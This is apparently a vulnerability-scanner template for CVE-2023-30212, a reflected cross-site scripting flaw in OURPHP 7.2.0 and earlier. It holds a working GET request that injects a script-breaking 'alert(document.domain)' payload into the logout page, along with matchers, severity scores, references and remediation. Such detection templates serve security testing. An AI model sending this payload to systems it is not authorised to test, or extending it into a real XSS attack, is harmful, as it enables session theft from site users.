http:
- matchers:
  - part: body
    type: word
    words:
    - location.href='../..</script><script>alert(document.domain)</script>'
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/client/manage/ourphp_out.php?ourphp_admin=logout&out=</script><script>alert(document.domain)</script>'
id: CVE-2023-30212
info:
  author: theamanrawat
  classification:
    cpe: cpe:2.3:a:ourphp:ourphp:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-30212
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.9844
    epss-score: 0.66021
  description: 'OURPHP <= 7.2.0 is vulnerale to Cross Site Scripting (XSS) via /client/manage/ourphp_out.php.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into web pages viewed by users, leading to potential
    data theft, session hijacking, or defacement of the affected website.

    '
  metadata:
    max-request: 1
    product: ourphp
    vendor: ourphp
    verified: true
  name: OURPHP <= 7.2.0 - Cross Site Scripting
  reference:
  - https://www.ourphp.net/
  - https://wanheiqiyihu.top/2023/03/27/OURPHP-v7-2-0-ourphp-out-php-Reflection-xss/
  - https://nvd.nist.gov/vuln/detail/CVE-2023-30212
  - https://github.com/JasaluRah/Creating-a-Vulnerable-Docker-Environment-CVE-2023-30212-
  - https://github.com/arunsnap/CVE-2023-30212-POC
  remediation: 'Upgrade to a patched version of OURPHP (7.2.1 or higher) to mitigate
    this vulnerability.

    '
  severity: medium
  tags: cve2023,cve,xss,ourphp,vuln
